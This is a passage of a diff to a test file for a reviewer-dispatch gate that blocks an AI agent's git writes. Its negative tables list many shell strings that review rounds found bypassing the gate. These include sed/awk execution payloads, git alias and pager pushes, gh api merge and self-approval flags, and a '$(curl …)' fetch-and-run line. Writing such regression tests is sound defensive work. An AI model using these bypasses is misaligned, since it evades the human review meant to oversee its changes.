@@ -61,6 +61,8 @@ import {
   withoutMandatedRailPath,
   isGhPrMergeCommand,
   isAdminMergeCommand,
+  mergeInvocationInText,
+  hasGhCommandWord,
   mergeVerbInText,
   readsNonMergeGhCall,
   ghShimWillEnforce,
@@ -70,8 +72,14 @@ import {
   maskHeredocData,
   heredocOpenersIn,
   isGitOp,
+  readsOnlyGhRead,
+  GH_READ_SUBCOMMANDS,
+  PR_NON_MERGE_SUBCOMMANDS,
+  tierSourceFor,
+  dispatchFloorMessage,
   isPushOrPrCreateCommand,
   reviewerRoleFor,
+  unspawnableMessage,
   extractMergePrNumber,
   extractMergeSelector,
   evidenceBodyIsCertifying,
@@ -117,7 +125,7 @@ import {
 } from "./index.js";
 // #2665: the token is imported from the module that OWNS it, so a rename cannot leave this
 // suite green (the review of #2665 caught the hardcoded copy).
-import { SPAWN_UNSPAWNABLE_TOKEN } from "../shared/spawn-capacity.js";
+import { SPAWN_ATTEMPT_CAP, SPAWN_UNSPAWNABLE_TOKEN } from "../shared/spawn-capacity.js";
 // The wording itself is pinned by its own drift suite (extensions/shared/reviewer-preflight.test.ts);
 // this file asserts the paths/route the DISCLOSURE hands a lane, so it reads the same constants.
 import {
@@ -2811,7 +2819,22 @@ testAsync("#485 T1: micro marker + 0 dispatches → blocked with MICRO_BLOCK_MES
         fs.writeFileSync("/tmp/agent-issue-complexity", "Micro\n");
         const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
         ok(blocked && blocked.block === true, "micro at 0 dispatches must block (#485)");
-        equal(blocked.reason, MICRO_BLOCK_MESSAGE, "micro block must carry the micro-specific remediation");
+        // #2204 (3): the refusal NAMES the tier it read, so the operator can tell a `micro` block
+        // from a block whose tier was never determined. The base message is still the prefix (its
+        // micro-specific remediation is pinned immediately below).
+        ok(
+          blocked.reason.startsWith(MICRO_BLOCK_MESSAGE),
+          "micro block must carry the micro-specific remediation"
+        );
+        ok(/\n   → Tier: micro — /.test(blocked.reason), "the micro refusal NAMES the tier it read (#2204)");
+        ok(
+          !/unlabeled/.test(blocked.reason.split("\n").find((l) => l.includes("→ Tier:")) ?? ""),
+          "a micro refusal must not name any tier but micro"
+        );
+        // #2204 (2): the refusal is NOT terminating — the SDK only stops the agent early when a
+        // blocked result carries `terminate: true`. Pinned explicitly, because "make the refusal
+        // stick" is the tempting edit and it is the one that ends a lane's run.
+        equal(blocked.terminate, false, "the refusal must not terminate the agent (#2204)");
         // Positive remediation-outcome pins (not just self-referential equality
         // to the exported const): the blocked micro agent must be told docs-only
         // sets need a lightweight [REVIEW] dispatch and that it must NOT go read
@@ -2895,7 +2918,18 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
           fs.writeFileSync("/tmp/agent-issue-complexity", producerValue);
           const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
           ok(blocked && blocked.block === true, `${producerValue.trim()} at 0 dispatches must block (#485)`);
-          equal(blocked.reason, BLOCK_MESSAGE, `${producerValue.trim()} block must carry the generic BLOCK_MESSAGE`);
+          ok(
+            blocked.reason.startsWith(BLOCK_MESSAGE),
+            `${producerValue.trim()} block must carry the generic BLOCK_MESSAGE`
+          );
+          // #2204 (3): the tier is NAMED in the message, and the audit says whether it was READ
+          // from the marker or never determined. `unknown` is the pre-flight's literal for an
+          // unlabeled issue, so it reports as UNDETERMINED — not as a stricter tier.
+          const expectedTier = producerValue.trim().toLowerCase() === "unknown" ? "unlabeled" : producerValue.trim().toLowerCase();
+          ok(
+            new RegExp(`\\n   → Tier: ${expectedTier} — `).test(blocked.reason),
+            `${producerValue.trim()} refusal names the tier that triggered it (${expectedTier}) (#2204)`
+          );
           ok(
             blocked.reason.includes("code-review/SKILL.md"),
             "generic remediation must direct the agent to the code-review dispatch protocol"
@@ -2916,6 +2950,14 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
             producerValue.trim().toLowerCase(),
             `${producerValue.trim()} gate_block audit carries the marker tier (same normalization as the production read)`
           );
+          // #2204 (3): `tier_source` separates "a tier was read" from "no tier was determined".
+          // Before it, `tier: unlabeled` was written for BOTH the marker-absent case and the
+          // pre-flight's literal `unknown`, so the log could not tell them apart.
+          equal(
+            blockAudit?.tier_source,
+            TIER_PROVENANCE[producerValue.trim().toLowerCase()],
+            `${producerValue.trim()} gate_block audit states whether the tier was READ or UNDETERMINED (#2204)`
+          );
           // #1492: the NON-micro branch must record the refused command too.
           equal(
             blockAudit?.command,
@@ -2928,7 +2970,21 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
         fs.unlinkSync("/tmp/agent-issue-complexity");
         const unlabeled = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
         ok(unlabeled && unlabeled.block === true, "unlabeled (no marker) at 0 dispatches must block");
-        equal(unlabeled.reason, BLOCK_MESSAGE, "unlabeled (no marker) block must carry the generic BLOCK_MESSAGE");
+        ok(
+          unlabeled.reason.startsWith(BLOCK_MESSAGE),
+          "unlabeled (no marker) block must carry the generic BLOCK_MESSAGE"
+        );
+        // #2204 (3) — THE POINT OF THE ISSUE: an ABSENT marker is not a strict tier. The refusal
+        // must say the tier was never determined, and must NOT read as "unlabeled is the strictest
+        // tier". Both halves are pinned: the label, and the sentence explaining what it means.
+        ok(
+          /\n   → Tier: unlabeled — no tier marker was present/.test(unlabeled.reason),
+          "an absent marker names tier `unlabeled` AND its provenance (#2204)"
+        );
+        ok(
+          unlabeled.reason.includes("NEVER DETERMINED") && unlabeled.reason.includes("uniform"),
+          "…saying the tier was never determined and that the floor is uniform, not stricter (#2204)"
+        );
         // #516 (cont.): the marker-ABSENT block audits tier "unlabeled" (the
         // TIER_RULE vocabulary key for no-marker sessions) so attribution stays
         // reconstructible when no marker file exists; Pass A blocked four ops
@@ -2937,6 +2993,11 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
         ok(unlabeledAudit, "unlabeled block must emit a gate_block audit entry");
         equal(unlabeledAudit?.reason, "no_reviewers_dispatch", "unlabeled gate_block audit pins reason no_reviewers_dispatch");
         equal(unlabeledAudit?.tier, "unlabeled", "unlabeled (no marker) gate_block audit carries tier unlabeled");
+        equal(
+          unlabeledAudit?.tier_source,
+          TIER_PROVENANCE.unlabeled,
+          "the marker-absent audit says the tier was UNDETERMINED (#2204)"
+        );
         equal(
           readAuditLines(auditLogPath()).filter((l) => l.event === "gate_block").length,
           4,
@@ -2965,6 +3026,686 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
       }
     });
   });
+});
+
+// ── #2204 — the dispatch floor must not refuse a READ ───────────────────────
+//
+// MEASURED on three cells: `for n in …; do gh pr view $n … done` and `sha=$(gh api repos/…)`
+// were refused with `reason: no_reviewers_dispatch`, and four lanes ended on the refusal within
+// ~60 s of starting. Both are READS, so there was no reviewer to dispatch for them. The candidate
+// came from `isGitOp`'s broad gh arms (a construct plus `gh`+`pr` is enough) — which is exactly
+// why a prefix list of `gh` verbs cannot be the predicate: the `gh` word sits inside a shell
+// construct, not at the start of the command.
+//
+// The floor itself must survive this fix. The tests below are therefore written as PAIRS: every
+// allow-shaped case has a write-shaped twin that must still be refused at zero dispatches.
+
+section("#2204 — a positively-readable read needs no reviewer dispatch");
+
+// The tier -> provenance map as DATA (fresh review, P2). The first version derived the expectation
+// with the same `tier === "unknown" ? … : …` ternary production uses, which is a TAUTOLOGY: it
+// agrees with the code by construction and would keep agreeing if both sides changed together. The
+// table is independent of the code, and the exhaustiveness check below stops a new tier shipping
+// without a declared provenance.
+const TIER_PROVENANCE: Record<string, "read" | "undetermined"> = {
+  micro: "read",
+  standard: "read",
+  complex: "read",
+  unknown: "undetermined", // the pre-flight's literal for an issue with no complexity label
+  unlabeled: "undetermined", // no marker file at all
+};
+
+test("#2204: readsOnlyGhRead — the measured shapes read, the writes do not", () => {
+  // The exact evidence shapes. These MUST be reads: they are what killed four lanes.
+  const reads = [
+    // ⛔ NO `git` WORD APPEARS IN THIS TABLE, ON PURPOSE. The escape certifies GH READS ONLY: a
+    // command that mentions git at all is refused here (design 3 — see `mentionsGitWord`), because
+    // every attempt to certify a git read by reading its text was measured running a program
+    // (`git grep -O<prog>`, `git ls-remote --upload-pack=<prog>`, `git -c core.gitProxy=p`,
+    // `git -c protocol.ext.allow=always ls-remote ext::<prog>`). Run the git command on its own
+    // line — it never needed a reviewer, and it is not certified here.
+    // evidence 1 — `gh pr view` inside a for loop (the log's first blocked command)
+    `cd /tmp/cell-home/wt-reapers && for n in 2058 2172 1858 1863 1161 2173; do echo "=== $n ==="; gh pr view "$n" --json title,body,state; done`,
+    // evidence 2 — `gh api` into a command substitution (the log's second)
+    `sha=$(gh api repos/daniel-ospina/agent-infra/pulls/1863 --jq .head.sha)`,
+    `for pr in 1863 1161; do sha=$(gh api repos/o/r/pulls/$pr --jq .head.sha); echo "$sha"; done`,
+    // reads that only exist inside a substitution or beside a redirection
+    `gh pr view $(gh api repos/x --jq .a)`,
+    `for n in 1 2; do gh pr view $n; done > /tmp/out.txt`,
+    `gh api repos/x --method GET`,
+    `gh issue view 5`,
+    // Read spellings of DUAL git verbs, and data filters in a pipe: refusing these would re-create
+    // #2204's false positive for ordinary triage loops (fresh review P2).
+    `gh pr view 1863 --json body | sed -n '3,12p'`,
+    `gh pr view 1863 --json body | awk 'NR>1'`,
+    `gh pr view 1863 --json body | jq -r .body`,
+    // ⛔ A QUOTED `|` IS NOT A PIPE (#2206 cycle-3 review, P1). The tokenizer splits on the raw
+    // character, so `'.[] | .body'` became the tokens `.[]`, `|`, `body'` and the stage test read
+    // `body` as a STAGE — refusing the fleet's ordinary triage read. These are the shapes the PR's
+    // own headline claim is about (`for … do gh pr view $n …` plus a filter), so a fix that refuses
+    // them has not delivered claim 1. The write-shaped twins below stay refused.
+    `for n in 1; do gh pr view $n --json comments --jq '.[] | .body'; done`,
+    `for n in 1; do gh pr view $n; done 2>/dev/null | grep -E 'open|closed'`,
+    `gh pr list | grep -E 'open|closed'`,
+    `for n in 1; do gh pr view $n; done | jq -r '.[] | .body'`,
+    // The positive allowlist must still certify the reads a triage loop runs beside them.
+    // …and a PLAIN setting or a directory on a read verb is still a read: the config guard refuses
+    // only values that can name a program.
+    // The flag allowlist must not refuse ordinary read flags -- including values, `=` spellings and
+    // combined shorts.
+    // ⛔ THE COUNTERPART TO THE BYPASS BLOCK IN THE NEGATIVE TABLE (#2206 re-review). Each of these
+    // sits NEXT TO a closed bypass, so a fix that simply refused the whole construct would red
+    // here instead of silently re-creating #2204's false positive:
+    `gh pr view 1 | awk -F, '{print $2}'`, // `-F,` is a field separator, NOT awk's `-f` script file
+    `gh pr view 1 | sed -n '3,12p'`, // …the ordinary print script stays a read
+    `gh pr view 1 | rg -n needle /tmp/src`, // rg without `--pre` runs nothing
+    `for n in 1 2; do gh pr view $n; done > /tmp/out.txt`, // a redirect TARGET is not a program
+    `for n in 1 2; do gh pr view $n; done 2>/dev/null`, // …nor is `2>/dev/null`
+    `for pr in 1; do sha=$(gh api repos/o/r/pulls/$pr --jq .head.sha); echo "$sha"; done`,
+    // ⛔ A REDIRECT TARGET FOLLOWED BY ANOTHER REDIRECTION (#2206 cycle-2 review, P1 over-block).
+    // The first cut of `isTrailingRedirectTarget` demanded the target END its segment, which refused
+    // the canonical `> out 2>&1` loop — the exact shape the exemption exists for — and made the
+    // verdict depend on the ORDER of the two redirections. All three orderings are pinned.
+    `for n in 1 2; do gh pr view $n; done > /tmp/out.txt 2>&1`,
+    `for n in 1 2; do gh pr view $n; done 2>&1 > /tmp/out.txt`,
+    `for n in 1 2; do gh pr view $n; done > /tmp/out.txt 2>/tmp/e.txt`,
+    // …and a path fragment attached to a substitution CLOSER is not an absolute-path program when
+    // the substitution itself is an ARGUMENT (the assembled word is `…/.a/x`, not `/x`).
+    `gh pr view $(gh api repos/x --jq .a)/x`,
+  ];
+  for (const cmd of reads) {
+    ok(readsOnlyGhRead(cmd), `POSITIVE READ expected (would be refused at 0 dispatches): ${cmd}`);
+  }
+  // The floor's own subjects, and every unreadable shape. These MUST NOT read.
+  const writes = [
+    "git commit -m x",
+    "git push",
+    "git push -u origin feat/x",
+    "github pr view 1",
+    "gh pr create --fill",
+    "gh pr merge 1",
+    "gh pr checkout 5",
+    // a read bundled with a write is a write
+    "gh pr view 1 && git push",
+    "for n in 1 2; do gh pr view $n; done && git commit -m x",
+    // a write spelled past the verb slot
+    "for f in 1 2; do git -C /tmp/wt commit -m $f; done && gh pr view 1",
+    "git c$'ommit' -m x",
+    // opaque executables: a program the text cannot read
+    `S='git push'; gh pr view 1; bash -c "$S"`,
+    "gh pr view 1; $CMD",
+    `gh pr view 1; node -e 'require("child_process").execSync("git push")'`,
+    "gh pr view 1; sh -c 'gh pr create --fill'",
+    "gh pr view 1 | sh",
+    // ⛔ THE PIPE STAGE IS A POSITIVE ALLOWLIST, and these are the shapes the first cut certified
+    // as a zero-dispatch READ (measured through the real handler, fresh review P1). Each one RUNS
+    // something the text never spelled as a command — which is the whole reason the floor exists.
+    "gh pr view 1 | env -i bash", // the runner is one WRAPPER word past the pipe
+    "gh pr view 1 | xargs -n1 sh", // xargs builds a command out of the stream
+    "gh pr view 1 | /bin/sh",
+    `gh pr view 1 | sed '1e /tmp/x.sh'`, // sed's `e` command executes the file
+    `gh pr view 1 | sed 'w /tmp/f'`, // …and `w` writes one
+    `gh pr view 1 | sed 's/a/b/e'`, // the substitution spelling of the same
+    `gh pr view 1 | awk 'BEGIN{system("/tmp/x")}'`,
+    `gh pr view 1 | awk '{print > "/tmp/f"}'`,
+    `gh pr view 1 | awk '"date" | getline x'`,
+    "gh pr view 1 | sort -o /tmp/f", // a filter whose FLAG opens an output file
+    "gh pr view 1 | uniq /tmp/out", // …or whose second argument is one
+    "gh pr view 1 | tee /tmp/f",
+    // A non-allowlisted gh GROUP must not reach the PROTOTYPE chain (#2204 cycle-3 review, P2):
+    // `GH_READ_SUBCOMMANDS[group]` yielded `Object` for `constructor`, so `.includes` threw out of
+    // the gate — a refusal with no audit row and no recovery text.
+    "gh constructor view 2",
+    "gh toString pr view 1",
+    "gh pr view 1; . <(echo 'git push')",
+    // a path-spelled gh is not a read this layer can certify
+    "/usr/bin/gh pr view 1",
+    // gh api writes -- including the ATTACHED short spellings, which pflag parses identically
+    // (`-fbody=x` IS `-f body=x`, a POST; the detached form alone let a SELF-APPROVAL of a PR
+    // read as a GET -- fresh review P1)
+    "gh api -X POST repos/o/r/issues -f title=x",
+    "gh api --method=POST repos/o/r/issues",
+    "gh api --input=x.json repos/x",
+    "gh api repos/x $F y=1",
+    "gh api graphql -f query='mutation { x }'",
+    "for n in 1; do gh pr view $n; gh api repos/o/r/issues -ftitle=pwn; done",
+    "gh api repos/o/r/pulls/1/reviews -fevent=APPROVE -fbody=lgtm",
+    "gh api repos/x -Fbody=@f",
+    "gh api repos/x $(echo -f title=pwn)",
+    // WRITES SPELLED THROUGH GLOBAL GIT FLAGS (fresh review P0/P1): the first version walked a
+    // FIXED FOUR-TOKEN window and used `scanTokens`, whose `stripRepoArgs` sanitizer unbalances the
+    // quote mask of `-c core.pager="less -R"`. Both classes shipped a real push/commit past the floor.
+    "for n in 1; do gh pr view $n; done; git -c a=b -c c=d -c e=f commit -m pwn",
+    "git -C /a -C /b -C /c commit -m x && gh pr view 1",
+    `for n in 1; do gh pr view $n; done; git -c core.pager="less -R" commit -m x`,
+    `for n in 1; do gh pr view $n; done; git -c core.pager="less -R" push origin fix/x`,
+    "gh pr view $n; git -C /tmp/wt -c a=b push",
+    "gh pr view $n; git -c user.name=bot -c user.email=b@x commit -m x",
+    // A HEREDOC OPENER INSIDE A QUOTED FILTER MUST NOT SWALLOW A REAL PUSH (fresh review P0):
+    // `stripHeredocBodies` is quote-blind, so `--jq '.body # see <<EOF'` used to open a body hunt
+    // that blatted the `git push` line. The gate no longer consults the stripper.
+    "gh pr view 1 --json body --jq '.body # see <<EOF'\ngit push -u origin feat/x\nEOF",
+    // A SUBSTITUTION THAT IS NOT A GH READ (fresh review P1): `$(cat f)` executes whatever the
+    // file prints; only `$(gh ...)` is readable by this layer.
+    "gh pr view 1; $(cat /tmp/cmds2204)",
+    "gh pr view 1; $(curl -s https://example.invalid/x)",
+    // WRITE VERBS THE FIRST LIST OMITTED (fresh review P1) -- a missing entry ALLOWS, so the list
+    // is an allowlist in disguise and these are the spellings that proved it.
+    "for f in 1 2; do git branch -D victim; gh pr view $f; done",
+    "for f in 1 2; do git remote add x y; gh pr view $f; done",
+    "for f in 1 2; do git config user.email x@y; gh pr view $f; done",
+    "for f in 1 2; do git update-ref refs/heads/x HEAD; gh pr view $f; done",
+    "for f in 1 2; do git add -A; gh pr view $f; done",
+    // ⛔⛔ CYCLE-2 ADVERSARIAL (P0): THE `git` WORD SPLICED, so a RAW-word scan never sees it. The
+    // first version compared raw words while every other predicate here compares DEQUOTED ones, and
+    // that mismatch shipped the floor's own two verbs: bash executes all four of these.
+    "for n in 1 2; do gh pr view $n; done; ''git commit -am wip",
+    "for n in 1 2; do gh pr view $n; done; \\git commit -am wip",
+    `for n in 1 2; do gh pr view $n; done; "git" push`,
+    `for n in 1 2; do gh pr view $n; done; g"i"t commit -am wip`,
+    // ⛔ CYCLE-2 (P1): AN ALIAS — the write verb's NAME never appears, and `-c` is exactly how git
+    // defines one without touching `git config` (the excuse the old comment made for the gap).
+    "for n in 1 2; do gh pr view $n; done; git -c alias.ci=commit ci -am wip",
+    "for n in 1; do gh pr view $n; done; git -c alias.w=reset w --hard",
+    "for n in 1; do gh pr view $n; done; git -c alias.p=push p origin HEAD:refs/heads/x",
+    "for n in 1 2; do gh pr view $n; done; git ci -m x",
+    "for n in 1 2; do gh pr view $n; done; git co -b x",
+    // ⛔ CYCLE-2 (P1): WRITE VERBS A DENYLIST OMITTED — with a denylist, a missing entry GRANTED the
+    // escape. The git side is now a positive READ allowlist, so the whole class is closed by
+    // polarity rather than by these particular spellings.
+    "for n in 1; do gh pr view $n; done; git update-index --force-remove f.txt",
+    "for n in 1; do gh pr view $n; done; git checkout-index -a -f",
+    "for n in 1; do gh pr view $n; done; git read-tree HEAD",
+    "for n in 1; do gh pr view $n; done; git hash-object -w f.txt",
+    "for n in 1; do gh pr view $n; done; git sparse-checkout set x",
+    "for n in 1; do gh pr view $n; done; git pack-refs --all",
+    "for n in 1; do gh pr view $n; done; git symbolic-ref HEAD refs/heads/x",
+    "for n in 1; do gh pr view $n; done; git frobnicate",
+    "for n in 1; do gh pr view $n; done; git",
+    "for f in 1 2; do git tag -d v1; gh pr view $f; done",
+    // ⛔ A READ SUBCOMMAND WITH A PROGRAM-BEARING CONFIG — the allowlist on the SUBCOMMAND is not
+    // enough, because `-c` can point git at a program it will run: `core.pager`, an editor, a hook
+    // path, ssh, a diff external, a content filter, a credential helper, an include — and `!` is
+    // git's own "run this as a shell command" prefix, so `git -c core.pager='!git push' log` writes
+    // under a verb this list certifies as a read (cycle-2 review, P1 follow-on).
+    "git -c core.pager='!git push' log --oneline -3; gh pr view 1",
+    "git -c alias.p=push log; gh pr view 1",
+    "git -c core.hooksPath=/tmp/evil log; gh pr view 1",
+    "git -c core.sshCommand='sh -c x' log; gh pr view 1",
+    "git -c diff.external=/tmp/x log; gh pr view 1",
+    "git -c include.path=/tmp/x log; gh pr view 1",
+    "git -c credential.helper=/tmp/x log; gh pr view 1",
+    "git --config-env=core.pager=EVIL log; gh pr view 1",
+    "git --exec-path=/tmp/evil log; gh pr view 1",
+    "git --exec-path /tmp/evil log; gh pr view 1",
+    // A FLAG ON A CERTIFIED READ VERB THAT NAMES A PROGRAM (confirming review, P1). The subcommand
+    // allowlist is not sufficient: `git grep -O<path>`, `--open-files-in-pager` and
+    // `git ls-remote --upload-pack=<path>` are READ verbs that RUN what their flag names -- measured
+    // executing, one of them creating a commit in a scratch repo while this session's own
+    // `git commit` was refused. Hence the FLAG allowlist: an unlisted flag is a refusal.
+    "for n in 1 2; do gh pr view $n; done; git grep -O/tmp/probe-exe needle",
+    "for n in 1 2; do gh pr view $n; done; git grep -O /tmp/probe-exe needle",
+    "for n in 1 2; do gh pr view $n; done; git grep --open-files-in-pager=/tmp/probe-exe needle",
+    "for n in 1 2; do gh pr view $n; done; git grep -e x -O/tmp/p",
+    "for n in 1 2; do gh pr view $n; done; git ls-remote --upload-pack=/tmp/probe-ship.sh /tmp/gitprobe",
+    "for n in 1 2; do gh pr view $n; done; git ls-remote --receive-pack=/tmp/x y",
+    "for n in 1 2; do gh pr view $n; done; git log --ext-diff",
+    "for n in 1 2; do gh pr view $n; done; git diff --textconv",
+    "for n in 1 2; do gh pr view $n; done; git log --output=.git/hooks/pre-commit",
+    "for n in 1 2; do gh pr view $n; done; git log --totally-new-flag",
+    "for n in 1 2; do gh pr view $n; done; git log -sO /tmp/x",
+    // ...and the same hole through a config KEY (`core.gitProxy`, `remote.*.uploadpack` were measured
+    // running; the key list is now a set of whole NAMESPACES, case-insensitive, because a per-key
+    // list missed them).
+    "for n in 1 2; do gh pr view $n; done; git -c core.gitProxy=p ls-remote git://h/x",
+    "for n in 1 2; do gh pr view $n; done; git -c remote.o.uploadpack=p ls-remote o",
+    "for n in 1 2; do gh pr view $n; done; git -c remote.o.receivepack=p ls-remote o",
+    "for n in 1 2; do gh pr view $n; done; git -c core.askPass=p log",
+    // ⛔ THE THIRD DESIGN (see `mentionsGitWord`): ANY git word beside a read is refused, however
+    // the call is spelled — including a plain READ. The measured decisive cases from three review
+    // rounds are kept as regressions so the surface cannot creep back in one allowlist at a time.
+    "for n in 1 2; do gh pr view $n; done; git log --oneline -3",
+    "for n in 1 2; do gh pr view $n; done; git rev-parse HEAD",
+    "for n in 1 2; do gh pr view $n; done; git status --porcelain",
+    "for n in 1 2; do gh pr view $n; done; git diff --stat main...HEAD",
+    'for n in 1 2; do gh pr view $n; done; git -c protocol.ext.allow=always ls-remote ext::/tmp/prog',
+    'for n in 1 2; do gh pr view $n; done; git -c core.quotepath=false log --oneline -3',
+    'for n in 1 2; do gh pr view $n; done; git --no-pager log --oneline -3',
+    'for n in 1 2; do gh pr view $n; done; git -C /tmp/wt log --oneline -1',
+    'for n in 1 2; do gh pr view $n; done; git ls-files -m',
+    'for n in 1 2; do gh pr view $n; done; git grep -n needle -- "*.ts"',
+    'for f in 1 2; do git log --oneline -1 $f; gh pr view $f; done',
+    // ⛔ #2206 REVIEW P0 — `--repo` EATS THE NEXT WORD, AND THAT WORD CAN BE `git`. The stripped
+    // form is what the VERB/FLAG reads want, and it was also what `mentionsGitWord` scanned, so a
+    // `git` sitting in the `--repo` value slot vanished and the escape certified the command. Both
+    // proven running at zero dispatches before the fix: the alias push (DESIGN-1's own class) and
+    // `update-index`, a write verb `GIT_COMMIT_PATTERN` does not know.
+    "for n in 1 2; do gh pr view $n; done; gh issue view 1 --repo git -c alias.p=push p origin HEAD:refs/heads/x",
+    "for n in 1 2; do gh pr view $n; done; gh issue view 1 --repo git update-index --force-remove f.txt",
+    // …and the same thing across the newline `\s*` also spans, which is how it was found.
+    "for n in 1 2; do gh pr view $n; done; gh issue view 1 --repo\ngit -c alias.p=push p origin HEAD:refs/heads/x",
+    "for n in 1 2; do gh pr view $n; done; gh issue view 1 --repo\ngit update-index --force-remove f.txt",
+    // ⛔ #2206 REVIEW P0 — A SUBSTITUTION THAT ASSEMBLES A `gh api` WRITE FLAG. `printf` was on
+    // `HARMLESS_SUBSTITUTION_PROGRAMS` ("its whole argument surface is data" — true of its INPUTS,
+    // false of its OUTPUT), so `$(printf -- '-%s%s' X POST)` became the single argv word `-XPOST`
+    // with no `-X` anywhere in the text for `hasApiWriteFlagAnywhere` to find. Both were measured
+    // CERTIFIED at zero dispatches: an unevidenced PR merge, and PR self-approval. The dimension is
+    // now removed — a `gh api` argument list may carry no substitution at all.
+    "for n in 1; do gh pr view $n; done; gh api $(printf -- '-%s%s' X POST) repos/o/r/pulls/1/merge",
+    "for n in 1; do gh pr view $n; done; gh api repos/o/r/pulls/1/reviews $(printf -- '-%s%s' f 'event=APPROVE')",
+    // …including inside DOUBLE quotes (the shell runs a substitution there too) and via a backtick,
+    // which assembles its words with no `-`-prefixed text to match.
+    'gh api "repos/$(printf \'%s\' x)" --jq .x',
+    "gh api `printf -- '-%s%s' X POST` repos/o/r/pulls/1/merge",
+    // ─── FRESH REVIEW #2 (P0/P1): SIX BYPASSES, EACH REPRODUCED THROUGH THE REAL `tool_call`
+    // HANDLER AT ZERO DISPATCHES AND EACH REALLY RUNNING OR WRITING. Every one below was
+    // certified as "Read-only command — the ≥1-dispatch floor covers writes, not reads" by the
+    // code that shipped before this block existed, so a missing entry here is not a missing nice-
+    // to-have: it is a reviewer-bypass primitive. The comments name WHICH conjunct was wrong.
+    //
+    // (1) P0 — the redirect/closer exemptions asked only whether a fragment LOOKED attached.
+    // Separators live in the GAP, so `/bin/bash`'s previous TOKEN was the redirection `>/dev/null`
+    // although a `;` sat between them, and `.trimEnd()` let a SPACE after `)` count as attached.
+    "for n in 1; do gh pr view $n; done >/dev/null; /bin/bash /tmp/x.sh",
+    // ⛔ #2206 CYCLE-3 REVIEW P0 — A REDIRECTION **TARGET** BETWEEN THE OPERATOR AND THE PROGRAM.
+    // `isCommandPositionAt` reads only the token immediately before the word, so the target `a`
+    // demoted `/bin/bash` out of command position while bash ran it. Each of these was measured
+    // CERTIFIED at zero dispatches (read=true, isGitOp=true) through the real predicate, and the
+    // shell really executed the program. The question is now answered positionally
+    // (`isSimpleCommandWordAt`), because the same hole is reached through `2>&1`'s `&`-residue.
+    "for n in 1; do gh pr view $n; done; > a /bin/bash /tmp/x.sh",
+    "for n in 1; do gh pr view $n; done; 2> a /bin/bash /tmp/x.sh",
+    "for n in 1; do gh pr view $n; done; > a 2>&1 /bin/bash /tmp/x.sh",
+    "for n in 1; do gh pr view $n; done; > out.txt python3 -c 'print(1)'",
+    "for n in 1; do gh pr view $n; done; > a ./push.sh",
+    "for n in 1; do gh pr view $n; done 2>/dev/null; python3 /tmp/x.py",
+    // the closer case: `$(echo /bin/)sh` is NOT a fragment, it completes `/bin/sh` across the `)`
+    "for n in 1; do gh pr view $n; done; $(echo /bin/)sh -c 'touch /tmp/x'",
+    // (2) P1 — `if (isData(i - 1)) continue` skipped the STAGE check itself: one quoted argument
+    // before the pipe certified the stage. This one overwrote a repo's `.git/hooks/pre-commit`.
+    'for n in 1 2; do gh pr view $n --json "body" | sort -o /tmp/f; done',
+    'for n in 1 2; do gh pr view $n --json "body" | tee /tmp/f; done',
+    'for n in 1 2; do gh pr view $n --json "body" | sort --compress-program=/tmp/c.sh; done',
+    // (3) P1 — the sed/awk script check cannot read a script delivered OUT OF BAND by `-f`, and
+    // its `(\s|;|$)` anchor missed `}` , a quote and `/`. The awk script below ran `git push`.
+    "for n in 1 2; do gh pr view $n | awk -f /tmp/ship.awk; done",
+    "for n in 1 2; do gh pr view $n | sed -n -f /tmp/ship.sed; done",
+    `gh pr view 1 | sed '1{p;e}'`,
+    `gh pr view 1 | sed -n 'e'`,
+    `gh pr view 1 | sed 'w/tmp/f'`,
+    // in-place writers, and gawk's second `-f`/exec spelling
+    `gh pr view 1 | sed -i 's/a/b/' /tmp/f`,
+    `gh pr view 1 | awk -i inplace '{print}' /tmp/f`,
+    `gh pr view 1 | awk -E /tmp/x.awk`,
+    // (4) P1 — `rg` is allowlisted but `--pre=<PROGRAM>` RUNS that program on every file searched.
+    // This is exactly the lesson `77d4c9a74` applied to git flags, not applied to the filters.
+    "for n in 1; do gh pr view $n; done | rg --pre=/tmp/pre.sh needle /tmp/src",
+    "gh pr view 1 | rg --pre /tmp/pre.sh needle /tmp/src",
+    // (5) P2 — a remote write spelled WITHOUT the word `git`; rule (1) never sees it.
+    `for n in 1; do gh pr view $n; done; curl -s -X PUT -H "Authorization: token $T" --data '{"content":"eA=="}' https://api.github.com/repos/o/r/contents/x`,
+    "for n in 1; do gh pr view $n; done; npm publish --access public",
+    "for n in 1; do gh pr view $n; done; rsync -a ./ host:/srv/app/",
+    // ─── RE-REVIEW (cycle 2): SIX MORE, EACH REPRODUCED THE SAME WAY. Four were the SAME CLASS as
+    // the block above — a lexical test where the question is semantic — which is why they are
+    // pinned here rather than trusted to the fix's prose.
+    //
+    // (6) P0 — `attachedToClose` asked whether the previous TOKEN ended with `/`, so
+    // `$(echo)/bin/bash` (previous token `/bin`) was exempted and bash assembled `/bin/bash`.
+    "gh pr view 1; $(echo)/bin/bash /tmp/x.sh",
+    "gh pr view 1; $(echo)/tmp/x.sh",
+    // (7) P0 — `isData(i)` skipped a QUOTED word in COMMAND position, because `isCommandName` only
+    // calls a quoted region a command name when it is the FIRST token of the simple command. An
+    // assignment or redirection prefix demoted it to DATA, and every one of these RAN the script.
+    `gh pr view 1; X=1 "/tmp/x.sh"`,
+    `gh pr view 1; >/tmp/o "/tmp/x.sh"`,
+    `gh pr view 1; 2>/dev/null "/tmp/x.sh"`,
+    // …and the same hole on the PIPELINE side: a quoted STAGE is still executed.
+    `gh pr view 1 | "sort" -o /tmp/f`,
+    // (8) P1 — the in-place flag was matched only as an ALL-LETTERS bundle, so the ordinary
+    // `-i.bak` / `-ni.bak` spelling WROTE the named file under a read certification.
+    `gh pr view 1 | sed -i.bak 's/a/b/' /tmp/f`,
+    `gh pr view 1 | sed -ni.bak 's/a/b/' /tmp/f`,
+    // (9) P1 — the sed address group could not match a REGEX address, so `sed '/re/e'` executed on
+    // GNU sed (the fleet's cells).
+    `gh pr view 1 | sed '/touch/e'`,
+    `gh pr view 1 | sed '/x/W'`,
+    // (10) P2 — `gh run download` WRITES artifact files into the working tree, so it is not a read.
